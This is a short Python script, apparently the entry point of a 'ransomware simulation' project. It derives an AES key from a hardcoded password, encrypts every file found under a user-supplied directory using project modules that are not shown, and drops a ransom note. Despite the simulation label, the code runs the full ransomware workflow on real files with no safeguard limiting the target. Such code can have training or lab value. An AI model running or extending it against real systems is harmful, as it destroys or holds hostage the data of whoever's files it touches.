from core import keygen, encryptor, ransom_note
from utils import file_finder


def run_simulation(base_path, password="supersecret"):
    key = keygen.generate_key(password)
    print(f"[INFO] AES key derived using stored salt.")

    files = file_finder.find_files(base_path)
    for f in files:
        encryptor.encrypt_file(f, key)
        print(f"[ENCRYPTED] {f}")

    ransom_note.drop_ransom_note(base_path)
    print("[INFO] Ransom note dropped.")


if __name__ == "__main__":
    target_dir = input("Enter path to simulate ransomware on: ")
    run_simulation(target_dir)
